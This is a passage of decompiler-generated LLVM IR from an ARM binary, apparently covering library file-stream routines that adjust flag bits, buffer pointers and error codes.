  br i1 %v2_1b054, label %dec_label_pc_1b05c, label %dec_label_pc_1b0c4

dec_label_pc_1b05c:                               ; preds = %dec_label_pc_1b04c, %dec_label_pc_1b040
  %v0_1b05c = load i32, i32* @r7, align 4
  %v7_1b05c = icmp eq i32 %v0_1b05c, 1
  br i1 %v7_1b05c, label %dec_label_pc_1b064, label %dec_label_pc_1b05c.dec_label_pc_1b078_crit_edge

dec_label_pc_1b05c.dec_label_pc_1b078_crit_edge:  ; preds = %dec_label_pc_1b05c
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_1b078

dec_label_pc_1b064:                               ; preds = %dec_label_pc_1b05c
  %v0_1b064 = load i32, i32* @r5, align 4
  %v2_1b068 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1b068, i32* %r1.global-to-local, align 4
  %v2_1b06c = inttoptr i32 %v0_1b064 to i16*
  %v3_1b06c = call i32 @function_1b160(i16* %v2_1b06c, i32 %v2_1b068)
  %v1_1b070 = icmp slt i32 %v3_1b06c, 0
  br i1 %v1_1b070, label %dec_label_pc_1b0c4, label %dec_label_pc_1b064.dec_label_pc_1b078_crit_edge

dec_label_pc_1b064.dec_label_pc_1b078_crit_edge:  ; preds = %dec_label_pc_1b064
  %v0_1b078.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b078

dec_label_pc_1b078:                               ; preds = %dec_label_pc_1b05c.dec_label_pc_1b078_crit_edge, %dec_label_pc_1b064.dec_label_pc_1b078_crit_edge
  %v2_1b080.pre-phi = phi i32 [ %.pre, %dec_label_pc_1b05c.dec_label_pc_1b078_crit_edge ], [ %v2_1b068, %dec_label_pc_1b064.dec_label_pc_1b078_crit_edge ]
  %v0_1b078 = phi i32 [ %v0_1b05c, %dec_label_pc_1b05c.dec_label_pc_1b078_crit_edge ], [ %v0_1b078.pre, %dec_label_pc_1b064.dec_label_pc_1b078_crit_edge ]
  store i32 %v0_1b078, i32* %r2.global-to-local, align 4
  %v0_1b07c = load i32, i32* @r5, align 4
  store i32 %v2_1b080.pre-phi, i32* %r1.global-to-local, align 4
  %v4_1b084 = call i32 @function_1b2ec(i32 %v0_1b07c, i32* nonnull %stack_var_-32, i32 %v0_1b078)
  %v1_1b088 = icmp slt i32 %v4_1b084, 0
  br i1 %v1_1b088, label %dec_label_pc_1b0c4, label %dec_label_pc_1b090

dec_label_pc_1b090:                               ; preds = %dec_label_pc_1b078
  %v0_1b090 = load i32, i32* @r5, align 4
  %v1_1b090 = inttoptr i32 %v0_1b090 to i16*
  %v2_1b090 = load i16, i16* %v1_1b090, align 2
  %v1_1b094 = add i32 %v0_1b090, 8
  %v2_1b094 = inttoptr i32 %v1_1b094 to i32*
  %v3_1b094 = load i32, i32* %v2_1b094, align 4
  store i32 %v3_1b094, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_1b09c = and i16 %v2_1b090, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_1b09c, i16* %v1_1b090, align 2
  %v0_1b0a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0a8 = load i32, i32* @r5, align 4
  %v2_1b0a8 = add i32 %v1_1b0a8, 28
  %v3_1b0a8 = inttoptr i32 %v2_1b0a8 to i32*
  store i32 %v0_1b0a8, i32* %v3_1b0a8, align 4
  %v0_1b0ac = load i32, i32* %r1.global-to-local, align 4
  %v1_1b0ac = trunc i32 %v0_1b0ac to i8
  %v2_1b0ac = load i32, i32* @r5, align 4
  %v3_1b0ac = add i32 %v2_1b0ac, 2
  %v4_1b0ac = inttoptr i32 %v3_1b0ac to i8*
  store i8 %v1_1b0ac, i8* %v4_1b0ac, align 1
  %v0_1b0b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0b0 = load i32, i32* @r5, align 4
  %v2_1b0b0 = add i32 %v1_1b0b0, 16
  %v3_1b0b0 = inttoptr i32 %v2_1b0b0 to i32*
  store i32 %v0_1b0b0, i32* %v3_1b0b0, align 4
  %v0_1b0b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0b4 = load i32, i32* @r5, align 4
  %v2_1b0b4 = add i32 %v1_1b0b4, 20
  %v3_1b0b4 = inttoptr i32 %v2_1b0b4 to i32*
  store i32 %v0_1b0b4, i32* %v3_1b0b4, align 4
  %v0_1b0b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0b8 = load i32, i32* @r5, align 4
  %v2_1b0b8 = add i32 %v1_1b0b8, 24
  %v3_1b0b8 = inttoptr i32 %v2_1b0b8 to i32*
  store i32 %v0_1b0b8, i32* %v3_1b0b8, align 4
  %v0_1b0bc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b0bc = load i32, i32* @r5, align 4
  %v2_1b0bc = add i32 %v1_1b0bc, 44
  %v3_1b0bc = inttoptr i32 %v2_1b0bc to i32*
  store i32 %v0_1b0bc, i32* %v3_1b0bc, align 4
  br label %dec_label_pc_1b0c8

dec_label_pc_1b0c4:                               ; preds = %dec_label_pc_1b04c, %dec_label_pc_1b078, %dec_label_pc_1b064
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b0c8

dec_label_pc_1b0c8:                               ; preds = %dec_label_pc_1b090, %dec_label_pc_1b0c4
  %v0_1b0c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b0c8 = icmp eq i32 %v0_1b0c8, 0
  br i1 %v2_1b0c8, label %dec_label_pc_1b0c8..thread6_crit_edge, label %bb18

dec_label_pc_1b0c8..thread6_crit_edge:            ; preds = %dec_label_pc_1b0c8
  %v0_1b0e0.pre = load i32, i32* @ip, align 4
  br label %.thread6

bb18:                                             ; preds = %dec_label_pc_1b0c8
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1b0d8 = load i32, i32* %r6.global-to-local, align 4
  %v3_1b0d8 = add i32 %v1_1b0d8, 24
  %v4_1b0d8 = inttoptr i32 %v3_1b0d8 to i32*
  %v5_1b0d8 = load i32, i32* %v4_1b0d8, align 4
  store i32 %v5_1b0d8, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1b0c8..thread6_crit_edge, %bb18
  %v0_1b0e0 = phi i32 [ %v0_1b0e0.pre, %dec_label_pc_1b0c8..thread6_crit_edge ], [ %v5_1b0d8, %bb18 ]
  %v2_1b0e0 = xor i1 %v2_1b0c8, true
  call void @__pseudo_cond_branch(i1 %v2_1b0e0, i32 %v0_1b0e0)
  br label %dec_label_pc_1b0e4

dec_label_pc_1b0e4:                               ; preds = %dec_label_pc_1afe0, %.thread6
  %v0_1b0e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1afb8, i32* @r4, align 4
  store i32 %v6_1afb8, i32* @r5, align 4
  store i32 %v12_1afb8, i32* @r7, align 4
  ret i32 %v0_1b0e4

; uselistorder directives
  uselistorder i32 %v0_1b078, { 1, 0 }
  uselistorder i32 %v3_1aff4, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 56, { 9, 5, 6, 7, 4, 10, 2, 8, 0, 1, 3 }
  uselistorder label %dec_label_pc_1b0e4, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1b0c8, { 1, 0 }
  uselistorder label %dec_label_pc_1b0c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1b078, { 1, 0 }
  uselistorder label %dec_label_pc_1b040, { 2, 1, 0 }
}

define i32 @function_1b0f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b0f8:
  %v0_1b0f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b0f8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1b0f8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1b0f8, %bb
  %v10_1b104 = phi i32 [ %arg1, %dec_label_pc_1b0f8 ], [ 0, %bb ]
  ret i32 %v10_1b104

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1b108(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1b108:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b108 = load i32, i32* @r4, align 4
  store i32 %v3_1b108, i32* %stack_var_-12, align 4
  %v0_1b10c = load i32, i32* %r0.global-to-local, align 4
  %v1_1b10c = inttoptr i32 %v0_1b10c to i16*
  %v2_1b10c = load i16, i16* %v1_1b10c, align 2
  %v3_1b10c = zext i16 %v2_1b10c to i32
  %v1_1b110 = and i32 %v3_1b10c, 4
  store i32 %v1_1b110, i32* %r5.global-to-local, align 4
  %v2_1b110 = icmp eq i32 %v1_1b110, 0
  store i32 %v0_1b10c, i32* %r4.global-to-local, align 4
  br i1 %v2_1b110, label %dec_label_pc_1b124, label %bb

bb:                                               ; preds = %dec_label_pc_1b108
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1b124:                               ; preds = %dec_label_pc_1b108
  %v1_1b124 = icmp slt i32 %arg2, 0
  br i1 %v1_1b124, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1b124
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1b124, %bb18
  %v1_1b12c = add i32 %v0_1b10c, 4
  %v2_1b12c = inttoptr i32 %v1_1b12c to i32*
  %v3_1b12c = load i32, i32* %v2_1b12c, align 4
  store i32 %v3_1b12c, i32* %r0.global-to-local, align 4
  %v1_1b130 = call i32 @function_127d8(i32 %v3_1b12c)
  store i32 %v1_1b130, i32* %r0.global-to-local, align 4
  %v5_1b138 = icmp sgt i32 %v1_1b130, 0
  br i1 %v5_1b138, label %.thread7, label %dec_label_pc_1b13c

dec_label_pc_1b13c:                               ; preds = %bb19
  %v2_1b134 = icmp eq i32 %v1_1b130, 0
  %v0_1b13c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b13c = inttoptr i32 %v0_1b13c to i16*
  %v2_1b13c = load i16, i16* %v1_1b13c, align 2
  br i1 %v2_1b134, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_1b13c
  %v2_1b140 = or i16 %v2_1b13c, 4
  store i16 %v2_1b140, i16* %v1_1b13c, align 2
  %v1_1b15c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_1b13c
  %v2_1b144 = or i16 %v2_1b13c, 8
  store i16 %v2_1b144, i16* %v1_1b13c, align 2
  %v1_1b150 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_1b150, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_1b15c = phi i32 [ %v1_1b15c.pre, %bb20 ], [ 0, %bb ], [ %v1_1b130, %bb19 ], [ %v1_1b150, %bb21 ]
  %v2_1b158 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b158, i32* @r4, align 4
  ret i32 %v1_1b15c

; uselistorder directives
  uselistorder i16 %v2_1b13c, { 1, 0 }
  uselistorder i32 %v1_1b130, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_127d8, { 1, 2, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_1b160(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1b160:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b160 = load i32, i32* @r4, align 4
  store i32 %v3_1b160, i32* %stack_var_-12, align 4
  %v3_1b164 = load i16, i16* %arg1, align 2
  %v4_1b164 = zext i16 %v3_1b164 to i32
  store i32 %v4_1b164, i32* @ip, align 4
  %tmp17 = urem i16 %v3_1b164, 4
  %v1_1b168 = zext i16 %tmp17 to i32
  store i32 %v1_1b168, i32* %r2.global-to-local, align 4
  %v2_1b168 = icmp eq i16 %tmp17, 0
  br i1 %v2_1b168, label %bb, label %dec_label_pc_1b17c

bb:                                               ; preds = %dec_label_pc_1b160
  br label %bb14

dec_label_pc_1b17c:                               ; preds = %dec_label_pc_1b160
  %v1_1b17c = add nsw i32 %v1_1b168, -1
  %v7_1b17c = icmp eq i16 %tmp17, 1
  br i1 %v7_1b17c, label %bb14, label %dec_label_pc_1b184

dec_label_pc_1b184:                               ; preds = %dec_label_pc_1b17c
  %v1_1b184 = and i32 %v4_1b164, 2048
  %v2_1b184 = icmp eq i32 %v1_1b184, 0
  br i1 %v2_1b184, label %bb14, label %dec_label_pc_1b18c

dec_label_pc_1b18c:                               ; preds = %dec_label_pc_1b184
  %v7_1b18c = icmp eq i32 %v1_1b17c, 2
  br i1 %v7_1b18c, label %dec_label_pc_1b210, label %dec_label_pc_1b194

dec_label_pc_1b194:                               ; preds = %dec_label_pc_1b18c
  %v2_1b194 = add i32 %tmp, 40
  %v3_1b194 = inttoptr i32 %v2_1b194 to i32*
  %v4_1b194 = load i32, i32* %v3_1b194, align 4
  store i32 %v4_1b194, i32* %r3.global-to-local, align 4
  %v2_1b198 = icmp eq i32 %v4_1b194, 0
  br i1 %v2_1b198, label %dec_label_pc_1b1a0, label %dec_label_pc_1b210

dec_label_pc_1b1a0:                               ; preds = %dec_label_pc_1b194
  %v2_1b1a0 = add i32 %tmp, 44
  %v3_1b1a0 = inttoptr i32 %v2_1b1a0 to i32*
  %v4_1b1a0 = load i32, i32* %v3_1b1a0, align 4
  store i32 %v4_1b1a0, i32* %r3.global-to-local, align 4
  %v2_1b1a4 = add i32 %tmp, 3
  %v3_1b1a4 = inttoptr i32 %v2_1b1a4 to i8*
  %v4_1b1a4 = load i8, i8* %v3_1b1a4, align 1
  %v5_1b1a4 = zext i8 %v4_1b1a4 to i32
  store i32 %v5_1b1a4, i32* %r2.global-to-local, align 4
  %v2_1b1a8 = icmp eq i32 %v4_1b1a0, 0
  br i1 %v2_1b1a8, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1b1a0
  %v1_1b1b03 = sub nsw i32 0, %v5_1b1a4
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1b1a0
  %v3_1b1ac = add i32 %tmp, 2
  %v4_1b1ac = inttoptr i32 %v3_1b1ac to i8*
  %v5_1b1ac = load i8, i8* %v4_1b1ac, align 1
  %v6_1b1ac = zext i8 %v5_1b1ac to i32
  store i32 %v6_1b1ac, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1b1ac, %v5_1b1a4
  %v3_1b1b4 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1b184, %dec_label_pc_1b17c, %bb13
  %v1_1b1c8 = phi i32 [ %v1_1b1b03, %.thread1 ], [ %v1_1b17c, %dec_label_pc_1b184 ], [ %v1_1b17c, %dec_label_pc_1b17c ], [ 0, %bb ], [ %v3_1b1b4, %bb13 ]
  %v1_1b1b8 = and i32 %v4_1b164, 64
  %v2_1b1b8 = icmp eq i32 %v1_1b1b8, 0
  %v2_1b1bc = add i32 %tmp, 16
  %v3_1b1bc = inttoptr i32 %v2_1b1bc to i32*
  %v4_1b1bc = load i32, i32* %v3_1b1bc, align 4
  store i32 %v4_1b1bc, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1b1b8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1b1c8 = sub i32 %v1_1b1c8, %v4_1b1bc
  store i32 %v2_1b1c8, i32* %r3.global-to-local, align 4
  %v1_1b1cc = inttoptr i32 %arg2 to i32*
  %v2_1b1cc = load i32, i32* %v1_1b1cc, align 4
  store i32 %v2_1b1cc, i32* %r0.global-to-local, align 4
  %v3_1b1cc = add i32 %arg2, 4
  %v4_1b1cc = inttoptr i32 %v3_1b1cc to i32*
  %v5_1b1cc = load i32, i32* %v4_1b1cc, align 4
  %v2_1b1d0 = add i32 %storemerge, %v2_1b1c8
  store i32 %v2_1b1d0, i32* %r4.global-to-local, align 4
  %v2_1b1d4 = sub i32 %v2_1b1cc, %v2_1b1d0
  store i32 %v2_1b1d4, i32* %r2.global-to-local, align 4
  %v2_1b1d8 = and i32 %v2_1b1d0, 1073741824
  %v3_1b1d8 = icmp ne i32 %v2_1b1d8, 0
  %v4_1b1d8 = ashr i32 %v2_1b1d0, 31
  %v6_1b1d8 = icmp eq i1 %v3_1b1d8, false
  %v7_1b1d8 = sub i32 %v5_1b1cc, %v4_1b1d8
  %v9_1b1d8 = sext i1 %v6_1b1d8 to i32
  %v10_1b1d8 = add i32 %v7_1b1d8, %v9_1b1d8
  store i32 %v10_1b1d8, i32* %r3.global-to-local, align 4
  %v2_1b1dc = sub i32 %v10_1b1d8, %v5_1b1cc
  %v4_1b1dc = xor i32 %v10_1b1d8, %v5_1b1cc
  %v5_1b1dc = xor i32 %v2_1b1dc, %v10_1b1d8
  %v6_1b1dc = and i32 %v5_1b1dc, %v4_1b1dc
  %v7_1b1dc = icmp slt i32 %v6_1b1dc, 0
  %v8_1b1dc = icmp slt i32 %v2_1b1dc, 0
  %v9_1b1dc = icmp eq i32 %v10_1b1d8, %v5_1b1cc
  store i32 %v2_1b1d4, i32* %v1_1b1cc, align 4
  %v5_1b1e0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1b1e0, i32* %v4_1b1cc, align 4
  %v3_1b1e4 = xor i1 %v8_1b1dc, %v7_1b1dc
  %v4_1b1e4 = or i1 %v9_1b1dc, %v3_1b1e4
  br i1 %v4_1b1e4, label %dec_label_pc_1b1e8, label %dec_label_pc_1b1f4

dec_label_pc_1b1e8:                               ; preds = %bb14
  br i1 %v9_1b1dc, label %dec_label_pc_1b1ec, label %dec_label_pc_1b1f8thread-pre-split

dec_label_pc_1b1ec:                               ; preds = %dec_label_pc_1b1e8
  %v0_1b1ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1b1ec = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1b1ec, %v1_1b1ec
  br i1 %tmp18, label %dec_label_pc_1b1f4, label %dec_label_pc_1b1f8thread-pre-split

dec_label_pc_1b1f4:                               ; preds = %dec_label_pc_1b1ec, %bb14
  %v0_1b1f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b1f4 = sub i32 0, %v0_1b1f4
  store i32 %v1_1b1f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b1f8

dec_label_pc_1b1f8thread-pre-split:               ; preds = %dec_label_pc_1b1ec, %dec_label_pc_1b1e8
  %v0_1b1f8.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b1f8

dec_label_pc_1b1f8:                               ; preds = %dec_label_pc_1b1f8thread-pre-split, %dec_label_pc_1b1f4
  %v0_1b1f8 = phi i32 [ %v0_1b1f8.pr, %dec_label_pc_1b1f8thread-pre-split ], [ %v1_1b1f4, %dec_label_pc_1b1f4 ]
  %v1_1b1f8 = icmp slt i32 %v0_1b1f8, 0
  br i1 %v1_1b1f8, label %dec_label_pc_1b200, label %dec_label_pc_1b214

dec_label_pc_1b200:                               ; preds = %dec_label_pc_1b1f8
  %v0_1b200 = call i32 @function_12b24()
  store i32 %v0_1b200, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1b208 = inttoptr i32 %v0_1b200 to i32*
  store i32 75, i32* %v2_1b208, align 4
  %v0_1b214.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b214

dec_label_pc_1b210:                               ; preds = %dec_label_pc_1b194, %dec_label_pc_1b18c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b214

dec_label_pc_1b214:                               ; preds = %dec_label_pc_1b1f8, %dec_label_pc_1b200, %dec_label_pc_1b210
  %v0_1b214 = phi i32 [ %v0_1b1f8, %dec_label_pc_1b1f8 ], [ %v0_1b214.pre, %dec_label_pc_1b200 ], [ -1, %dec_label_pc_1b210 ]
  store i32 %v0_1b214, i32* %r0.global-to-local, align 4
  %v2_1b21c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b21c, i32* @r4, align 4
  ret i32 %v0_1b214

; uselistorder directives
  uselistorder i32 %v0_1b214, { 1, 0 }
  uselistorder i1 %v9_1b1dc, { 1, 0 }
  uselistorder i32 %v2_1b1dc, { 1, 0 }
  uselistorder i32 %v10_1b1d8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1b1cc, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 2, 1 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1b214, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @function_1b224(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b224:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1b224 = load i32, i32* @r4, align 4
  store i32 %v3_1b224, i32* %stack_var_-8, align 4
  %v1_1b228 = add i32 %arg1, 8
  %v1_1b22c = inttoptr i32 %v1_1b228 to i32*
  %v2_1b22c = load i32, i32* %v1_1b22c, align 4
  %v3_1b22c = add i32 %arg1, 12
  %v4_1b22c = inttoptr i32 %v3_1b22c to i32*
  %v5_1b22c = load i32, i32* %v4_1b22c, align 4
  %v2_1b230 = sub i32 %v5_1b22c, %v2_1b22c
  store i32 %v2_1b230, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1b238 = inttoptr i32 %arg1 to i16*
  %v4_1b238 = call i32 @function_1b108(i16* %v3_1b238, i32 %v2_1b22c, i32 %v2_1b230)
  %v0_1b23c = load i32, i32* @r4, align 4
  %v1_1b23c = add i32 %v0_1b23c, 8
  %v2_1b23c = inttoptr i32 %v1_1b23c to i32*
  %v3_1b23c = load i32, i32* %v2_1b23c, align 4
  store i32 %v3_1b23c, i32* %r2.global-to-local, align 4
  %v2_1b240 = add i32 %v3_1b23c, %v4_1b238
  %v2_1b244 = add i32 %v0_1b23c, 20
  %v3_1b244 = inttoptr i32 %v2_1b244 to i32*
  store i32 %v2_1b240, i32* %v3_1b244, align 4
  %v0_1b248 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b248 = load i32, i32* @r4, align 4
  %v2_1b248 = add i32 %v1_1b248, 16
  %v3_1b248 = inttoptr i32 %v2_1b248 to i32*
  store i32 %v0_1b248, i32* %v3_1b248, align 4
  %v2_1b24c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1b24c, i32* @r4, align 4
  ret i32 %v4_1b238

; uselistorder directives
  uselistorder i32 %v4_1b238, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1b254() local_unnamed_addr {
dec_label_pc_1b254:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1b254 = load i32, i32* @r4, align 4
  store i32 %v3_1b254, i32* %stack_var_-12, align 4
  %v0_1b258 = load i32, i32* @r0, align 4
  %v1_1b258 = inttoptr i32 %v0_1b258 to i16*
  %v2_1b258 = load i16, i16* %v1_1b258, align 2
  %v3_1b258 = zext i16 %v2_1b258 to i32
  store i32 %v3_1b258, i32* %r3.global-to-local, align 4
  %v0_1b25c = load i32, i32* @r1, align 4
  %v2_1b25c = and i32 %v0_1b25c, %v3_1b258
  %v4_1b25c = icmp eq i32 %v2_1b25c, 0
  store i32 %v0_1b258, i32* @r4, align 4
  br i1 %v4_1b25c, label %dec_label_pc_1b26c, label %dec_label_pc_1b27c

dec_label_pc_1b26c:                               ; preds = %dec_label_pc_1b254
  %v1_1b26c = and i32 %v3_1b258, 2176
  %v2_1b26c = icmp eq i32 %v1_1b26c, 0
  br i1 %v2_1b26c, label %dec_label_pc_1b274, label %dec_label_pc_1b288

dec_label_pc_1b274:                               ; preds = %dec_label_pc_1b26c
  %v2_1b274 = or i32 %v0_1b25c, %v3_1b258
  store i32 %v2_1b274, i32* %r3.global-to-local, align 4
  %v1_1b278 = trunc i32 %v2_1b274 to i16
  store i16 %v1_1b278, i16* %v1_1b258, align 2
  %v0_1b27c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b27c

dec_label_pc_1b27c:                               ; preds = %dec_label_pc_1b254, %dec_label_pc_1b274
  %v0_1b27c = phi i32 [ %v0_1b258, %dec_label_pc_1b254 ], [ %v0_1b27c.pre, %dec_label_pc_1b274 ]
  %v1_1b27c = inttoptr i32 %v0_1b27c to i16*
  %v2_1b27c = load i16, i16* %v1_1b27c, align 2
  %v3_1b27c = zext i16 %v2_1b27c to i32
  store i32 %v3_1b27c, i32* %r3.global-to-local, align 4
  %v1_1b280 = and i32 %v3_1b27c, 16
  store i32 %v1_1b280, i32* %r5.global-to-local, align 4
  %v2_1b280 = icmp eq i32 %v1_1b280, 0
  br i1 %v2_1b280, label %dec_label_pc_1b2a8, label %dec_label_pc_1b288

dec_label_pc_1b288:                               ; preds = %dec_label_pc_1b26c, %dec_label_pc_1b27c
  %v0_1b288 = call i32 @function_12b24()
  store i32 %v0_1b288, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1b290 = inttoptr i32 %v0_1b288 to i32*
  store i32 9, i32* %v2_1b290, align 4
  br label %dec_label_pc_1b294

dec_label_pc_1b294:                               ; preds = %dec_label_pc_1b2b0, %dec_label_pc_1b288
  %v0_1b294 = load i32, i32* @r4, align 4
  %v1_1b294 = inttoptr i32 %v0_1b294 to i16*
  %v2_1b294 = load i16, i16* %v1_1b294, align 2
  %v3_1b294 = zext i16 %v2_1b294 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1b29c = or i32 %v3_1b294, 8
  store i32 %v1_1b29c, i32* %r3.global-to-local, align 4
  %v1_1b2a0 = trunc i32 %v1_1b29c to i16
  store i16 %v1_1b2a0, i16* %v1_1b294, align 2
  %v1_1b2e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b2e0

dec_label_pc_1b2a8:                               ; preds = %dec_label_pc_1b27c
  %v1_1b2a8 = and i32 %v3_1b27c, 64
  %v2_1b2a8 = icmp eq i32 %v1_1b2a8, 0
  br i1 %v2_1b2a8, label %dec_label_pc_1b2d0, label %dec_label_pc_1b2b0

dec_label_pc_1b2b0:                               ; preds = %dec_label_pc_1b2a8
  %v0_1b2b0 = call i32 @function_12d98()
  store i32 %v0_1b2b0, i32* %r0.global-to-local, align 4
  %v2_1b2b4 = icmp eq i32 %v0_1b2b0, 0
  br i1 %v2_1b2b4, label %dec_label_pc_1b2bc, label %dec_label_pc_1b294

dec_label_pc_1b2bc:                               ; preds = %dec_label_pc_1b2b0
  %v0_1b2bc = load i32, i32* @r4, align 4
  %v1_1b2bc = inttoptr i32 %v0_1b2bc to i16*
  %v2_1b2bc = load i16, i16* %v1_1b2bc, align 2
  %v3_1b2bc = zext i16 %v2_1b2bc to i32
  store i32 %v3_1b2bc, i32* %r3.global-to-local, align 4
  %v1_1b2c0 = add i32 %v0_1b2bc, 8
  %v2_1b2c0 = inttoptr i32 %v1_1b2c0 to i32*
  %v3_1b2c0 = load i32, i32* %v2_1b2c0, align 4
  %v1_1b2c4 = and i32 %v3_1b2bc, 65471
  store i32 %v1_1b2c4, i32* %r3.global-to-local, align 4
  %v2_1b2c8 = add i32 %v0_1b2bc, 28
  %v3_1b2c8 = inttoptr i32 %v2_1b2c8 to i32*
  store i32 %v3_1b2c0, i32* %v3_1b2c8, align 4
  %v0_1b2cc = load i32, i32* %r3.global-to-local, align 4
  %v1_1b2cc = trunc i32 %v0_1b2cc to i16
  %v2_1b2cc = load i32, i32* @r4, align 4
  %v3_1b2cc = inttoptr i32 %v2_1b2cc to i16*
  store i16 %v1_1b2cc, i16* %v3_1b2cc, align 2
  %v0_1b2d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b2d0

dec_label_pc_1b2d0:                               ; preds = %dec_label_pc_1b2a8, %dec_label_pc_1b2bc
  %v2_1b2d8 = phi i32 [ %v0_1b27c, %dec_label_pc_1b2a8 ], [ %v0_1b2d0.pre, %dec_label_pc_1b2bc ]
  %v1_1b2d0 = inttoptr i32 %v2_1b2d8 to i16*
  %v2_1b2d0 = load i16, i16* %v1_1b2d0, align 2
  %v3_1b2d0 = zext i16 %v2_1b2d0 to i32
  %v1_1b2d4 = or i32 %v3_1b2d0, 1
  store i32 %v1_1b2d4, i32* %r3.global-to-local, align 4
